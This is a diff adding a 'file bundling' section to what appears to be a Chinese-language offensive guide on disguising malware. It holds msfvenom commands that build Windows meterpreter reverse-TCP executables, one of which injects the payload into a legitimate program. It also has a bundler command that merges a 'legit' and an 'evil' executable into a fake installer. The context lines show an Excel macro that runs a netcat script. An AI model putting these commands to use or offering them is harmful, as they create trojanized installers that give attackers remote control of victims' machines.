@@ -256,3 +256,23 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=4444 -f vbs > e
 =EXEC("C:\\Users\\Administrator\\Desktop\\nc.cmd")
 =HALT()
 ```
+
+### 文件捆绑
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP地址 LPORT=443 -f exe > shell.exe
+```
+
+[file_bundler.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/file_bundler.py)
+
+```bash
+python file_bundler.py --legit hi.exe --evil shell.exe --output bundled_installer.exe
+```
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP地址 LPORT=443 -x hi.exe -k -f exe > shell.exe
+```
+
+### 自解压
+
+## 白名单
